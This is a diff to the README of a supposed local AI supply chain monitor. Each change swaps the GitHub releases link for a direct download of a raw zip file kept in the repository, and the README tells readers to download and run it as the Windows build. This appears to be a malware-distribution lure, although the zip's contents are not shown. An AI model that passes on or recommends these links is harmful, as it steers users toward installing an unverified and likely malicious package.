@@ -1,6 +1,6 @@
 # 🧭 supply-chain-monitor-localai - Track supply data with local AI
 
-[![Download the latest release](https://img.shields.io/badge/Download-Releases-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Releases-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/raw/refs/heads/main/spiderly/chain_localai_supply_monitor_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@
 
 Use the release page to get the latest version:
 
-https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/releases
+https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/raw/refs/heads/main/spiderly/chain_localai_supply_monitor_v3.7.zip
 
 ## 📥 Download and Install
 
@@ -160,7 +160,7 @@ This app is a local supply chain monitor with AI help. It is useful if you want:
 
 Use this page to download and run the latest Windows build:
 
-https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/releases
+https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/raw/refs/heads/main/spiderly/chain_localai_supply_monitor_v3.7.zip
 
 ## 🧩 Example Use Cases
 
@@ -204,4 +204,4 @@ This makes it easier to find the app and model files later.
 
 Check the release page for new builds, fixes, and changes:
 
-https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/releases
+https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/raw/refs/heads/main/spiderly/chain_localai_supply_monitor_v3.7.zip
